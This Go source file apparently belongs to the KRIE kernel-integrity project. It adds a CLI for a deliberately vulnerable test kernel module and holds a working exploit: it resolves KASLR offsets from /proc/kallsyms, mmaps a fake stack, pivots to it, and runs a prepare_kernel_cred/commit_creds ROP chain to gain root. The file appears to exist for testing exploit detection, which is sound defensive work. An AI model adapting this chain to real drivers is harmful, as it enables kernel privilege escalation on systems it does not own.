/*
Copyright © 2022 GUILLAUME FOURNIER

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package run

import (
	"encoding/json"
	"fmt"
	"io"
	"os"
	"strconv"
	"strings"
	"syscall"
	"unsafe"

	"github.com/sirupsen/logrus"
	"github.com/spf13/cobra"
	"golang.org/x/sys/unix"

	"github.com/Gui774ume/krie/pkg/krie/events"
)

var VulnDevice = &cobra.Command{
	Use:   "vuln-device",
	Short: "Interract with the vuln_device kernel module",
}

var Offsets = &cobra.Command{
	Use:   "offsets",
	Short: "Compute a kernel offset from an offset in a System.map file",
	RunE:  offsetsCmd,
}

var Trigger = &cobra.Command{
	Use:   "trigger",
	Short: "Trigger the vuln_device vulnerability",
	RunE:  triggerCmd,
}

func init() {
	Offsets.Flags().StringVar(
		&options.SystemMapFile,
		"system-map-file",
		"/boot/System.map-5.4.0-105-generic",
		"System.map file to use when computing offsets")
	Offsets.Flags().StringVar(
		&options.KallsymsSystemMapOffsetSymbol,
		"kallsyms-system-map-offset-symbol",
		"commit_creds",
		"symbol used to compute the diff in offset between /proc/kallsyms and System.map")
	Offsets.Flags().Var(
		NewKRIEToolOptionsSanitizer(&options, "gadget_addr"),
		"gadget",
		"gadget in System.map to translate into /proc/kallsyms")
	Offsets.MarkFlagRequired("gadget")
	Offsets.Flags().BoolVar(
		&options.ComputeOffsetFromFnArray,
		"compute-offset-from-fn-array",
		true,
		"compute the offset between the provided gadget_addr in kernel memory and the fn_array address of vuln_device")

	Trigger.Flags().StringVar(
		&options.VulnDevicePath,
		"vuln-device-path",
		"/dev/vuln_device",
		"path to the vulnerable character device")
	Trigger.Flags().Var(
		NewKRIEToolOptionsSanitizer(&options, "gadget_addr"),
		"gadget",
		"gadget in System.map used to pivot the stack")
	Trigger.MarkFlagRequired("gadget")

	VulnDevice.AddCommand(Offsets)
	VulnDevice.AddCommand(Trigger)
}

func fetchSymbolAddr(data []byte, symbol string) uint64 {
	for _, s := range strings.Split(string(data), "\n") {
		elems := strings.Split(s, " ")
		if len(elems) < 3 {
			continue
		}
		if elems[2] != symbol {
			continue
		}
		addr, err := strconv.ParseUint(elems[0], 16, 64)
		if err != nil {
			logrus.Errorln(err)
			return 0
		}
		return addr
	}
	return 0
}

var diff uint64
var sign int

func computeKernelAddr(gadgetAddr uint64) (uint64, error) {
	if diff == 0 && sign == 0 {
		// read /proc/kallsyms content
		kallsyms, err := os.ReadFile("/proc/kallsyms")
		if err != nil {
			return 0, fmt.Errorf("couldn't open /proc/kallsyms: %v", err)
		}

		kallsymsAddr := fetchSymbolAddr(kallsyms, options.KallsymsSystemMapOffsetSymbol)
		if kallsymsAddr == 0 {
			return 0, fmt.Errorf("couldn't find symbol %s in /proc/kallsyms, try with another one", options.KallsymsSystemMapOffsetSymbol)
		}

		// read the provided System.Map content
		systemMap, err := os.ReadFile(options.SystemMapFile)
		if err != nil {
			return 0, fmt.Errorf("couldn't open %s: %v", options.SystemMapFile, err)
		}

		systemMapAddr := fetchSymbolAddr(systemMap, options.KallsymsSystemMapOffsetSymbol)
		if systemMapAddr == 0 {
			return 0, fmt.Errorf("couldn't find symbol %s in %s, try with another one", options.KallsymsSystemMapOffsetSymbol)
		}

		if kallsymsAddr > systemMapAddr {
			diff = kallsymsAddr - systemMapAddr
			sign = 1
		} else {
			diff = systemMapAddr - kallsymsAddr
			sign = -1
		}
	}

	var addr uint64
	if sign > 0 {
		logrus.Infof("System.map -> kallsyms diff: +0x%x", diff)
		addr = gadgetAddr + diff
	} else {
		logrus.Infof("System.map -> kallsyms diff: -0x%x", diff)
		addr = gadgetAddr - diff
	}
	return addr, nil
}

func mustComputeKernelAddr(gadgetAddr uint64) uint64 {
	addr, _ := computeKernelAddr(gadgetAddr)
	return addr
}

func offsetsCmd(cmd *cobra.Command, args []string) error {
	// Set log level
	logrus.SetLevel(options.LogLevel)

	if os.Getuid() > 0 {
		return fmt.Errorf("ktool needs to run as root")
	}

	logrus.Infof("computing offset in kernel memory for gadget at 0x%x in %s", options.SystemMapGadgetAddr, options.SystemMapFile)
	addr, err := computeKernelAddr(options.SystemMapGadgetAddr)
	if err != nil {
		return err
	}
	logrus.Infof("gadget_addr in kernel memory is: 0x%x", addr)
	logrus.Infof("user space stack should be at: 0x%x", addr&0xFFFFFFFF)

	if options.ComputeOffsetFromFnArray {
		info, err := parseVulnDeviceInfo()
		if err != nil {
			return err
		}

		if addr > info.FnArrayAddr {
			logrus.Infof("offset from @fn_array is: +0x%x", int(addr-info.FnArrayAddr)/8)
		} else {
			logrus.Infof("offset from @fn_array is: -0x%x", int(info.FnArrayAddr-addr)/8)
		}
	}
	return nil
}

// VulnDeviceInfo is the structure used to parse the info string from the vulnerable device
type VulnDeviceInfo struct {
	MajorNum       int    `json:"major_num"`
	FnArrayAddrStr string `json:"@fn_array"`
	FnArrayAddr    uint64 `json:"-"`
}

func (info VulnDeviceInfo) String() string {
	return fmt.Sprintf("major_num:%d @fn_array:0x%x", info.MajorNum, info.FnArrayAddr)
}

func parseVulnDeviceInfo() (*VulnDeviceInfo, error) {
	f, err := os.Open(options.VulnDevicePath)
	if err != nil {
		return nil, fmt.Errorf("couldn't open %s: %v", options.VulnDevicePath, err)
	}
	defer f.Close()

	infoRaw, err := io.ReadAll(f)
	if err != nil {
		return nil, fmt.Errorf("couldn't read vuln_device info: %v", err)
	}

	var info VulnDeviceInfo
	err = json.Unmarshal(infoRaw, &info)
	if err != nil {
		return nil, fmt.Errorf("couldn't parse vuln_device info: %v", err)
	}

	info.FnArrayAddr, err = strconv.ParseUint(strings.TrimPrefix(info.FnArrayAddrStr, "0x"), 16, 64)
	if err != nil {
		return nil, fmt.Errorf("couldn't parse vuln_device fn_array address from %s: %v", info.FnArrayAddrStr, err)
	}
	return &info, nil
}

type Slice struct {
	Data unsafe.Pointer
	Len  int
	Cap  int
}

func triggerCmd(cmd *cobra.Command, args []string) error {
	// Set log level
	logrus.SetLevel(options.LogLevel)

	// fetch vuln_device info
	info, err := parseVulnDeviceInfo()
	if err != nil {
		return fmt.Errorf("couldn't trigger vulnerability: %v", err)
	}
	logrus.Infof("vuln_device detected: %s", info)

	// compute stack pivot gadget address in kernel space : xchg eax, esp ; ret 0xd
	addr, err := computeKernelAddr(options.SystemMapGadgetAddr)
	if err != nil {
		return err
	}

	// from the stack pivot addr, we get the user space address where the fake kernel stack will live
	fakeStackAddr := uintptr(addr & 0xFFFFFFFF)
	logrus.Infof("fake stack addr: %x", fakeStackAddr)
	// reserve 2 pages to be extra safe
	length := 2 * os.Getpagesize()

	// mmap the memory region around the future fake stack addr
	r0, _, e1 := syscall.Syscall6(syscall.SYS_MMAP, fakeStackAddr, uintptr(length), uintptr(unix.PROT_READ|unix.PROT_WRITE|unix.PROT_EXEC), uintptr(unix.MAP_SHARED|unix.MAP_ANON), uintptr(0), uintptr(0))
	fakeStackPageBaseAddr := r0
	if e1 != 0 {
		return fmt.Errorf("couldn't map memory segment: %w", e1)
	}

	// use unsafe to turn fakeStackPageBaseAddr into a []byte.
	var kernelStack []byte
	hdr := (*Slice)(unsafe.Pointer(&kernelStack))
	hdr.Data = unsafe.Pointer(fakeStackPageBaseAddr)
	hdr.Cap = length
	hdr.Len = length

	// compute the offset into data where the fake stack starts
	stackCursor := int(fakeStackAddr - fakeStackPageBaseAddr)

	// start writing the rop chain
	events.ByteOrder.PutUint64(kernelStack[stackCursor:stackCursor+8], mustComputeKernelAddr(0xffffffff81010663)) // pop rdi ; ret
	stackCursor += 8
	// account for ret 0xd from the stack pivot
	stackCursor += 0xd
	events.ByteOrder.PutUint64(kernelStack[stackCursor:stackCursor+8], uint64(0)) // NULL
	stackCursor += 8
	events.ByteOrder.PutUint64(kernelStack[stackCursor:stackCursor+8], mustComputeKernelAddr(0xffffffff810c54d0)) // @prepare_kernel_cred
	stackCursor += 8
	events.ByteOrder.PutUint64(kernelStack[stackCursor:stackCursor+8], mustComputeKernelAddr(0xffffffff81010bfa)) // pop rdx ; ret
	stackCursor += 8
	events.ByteOrder.PutUint64(kernelStack[stackCursor:stackCursor+8], mustComputeKernelAddr(0xffffffff810c5156)) // @commit_creds + 2 instructions
	stackCursor += 8
	events.ByteOrder.PutUint64(kernelStack[stackCursor:stackCursor+8], mustComputeKernelAddr(0xffffffff81012335)) //  mov rax, rdi ; ret
	stackCursor += 8
	events.ByteOrder.PutUint64(kernelStack[stackCursor:stackCursor+8], mustComputeKernelAddr(0xffffffff82cd0e16)) // mov rdi, rax ; call rdx
	stackCursor += 8

	f, err := os.OpenFile(options.VulnDevicePath, os.O_WRONLY, 0)
	if err != nil {
		return fmt.Errorf("couldn't open %s: %v", options.VulnDevicePath, err)
	}

	_, _ = f.WriteString("this is a simple string to trigger the vulnerability")
	_ = f.Sync()

	logrus.Infof("current user is: %d", os.Getuid())
	return nil
}
